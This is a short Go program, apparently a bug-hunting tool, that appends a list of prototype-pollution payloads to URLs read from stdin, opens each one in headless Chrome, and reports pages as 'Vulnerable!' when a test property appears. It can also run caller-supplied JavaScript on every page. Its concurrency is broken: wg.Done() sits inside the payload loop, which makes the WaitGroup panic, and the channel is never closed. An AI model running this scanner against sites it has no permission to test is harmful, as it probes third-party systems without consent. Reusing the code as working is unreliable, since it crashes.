package main

import (
	"bufio"
	"context"
	"flag"
	"fmt"
	"log"
	"os"
	"sync"

	"github.com/TwinProduction/go-color"
	"github.com/chromedp/chromedp"
)

func main() {
	payloads := []string{
		"#__proto__[test]=test",
		"?__proto__.array=1|2|3",
		"?__proto__.test=test",
		"?__proto__[test]=test",
		"?__proto__[test]={\"json\":\"value\"}",
		"?constructor.prototype.test=test",
		"?constructor[prototype][test]=test"}

	var userJS string
	flag.StringVar(&userJS, "js", "", "the JS to run on each page")
	flag.Parse()

	sc := bufio.NewScanner(os.Stdin)

	var wg sync.WaitGroup
	urls := make(chan string)
	for i := 0; i < 7; i++ {
		wg.Add(1)
		go func() {
			for u := range urls {
				for _, payload := range payloads {
					// fmt.Println(i, payload)

					u := u + payload

					ctx, cancel := chromedp.NewContext(context.Background())

					var res string

					// log.Printf("userJS: %s", userJS)

					if userJS == "" {
						userJS = "window.test? \"vulnerable\" : \"not vulnerable\""
					}

					err := chromedp.Run(ctx,
						chromedp.Navigate(u),
						chromedp.Evaluate(userJS, &res),
					)
					cancel()

					if err != nil {
						log.Printf("error: %s", err)
						continue
					}

					if res == "vulnerable" {
						fmt.Println(u, ":", color.Colorize(color.Red, "Vulnerable!"))

					} else {
						fmt.Println(u, ":", color.Colorize(color.Green, "Not vulnerable"))
					}
                wg.Done()
				}

			}
		}()

	}

	for sc.Scan() {
		u := sc.Text()
		urls <- u
	}
	wg.Wait()
}
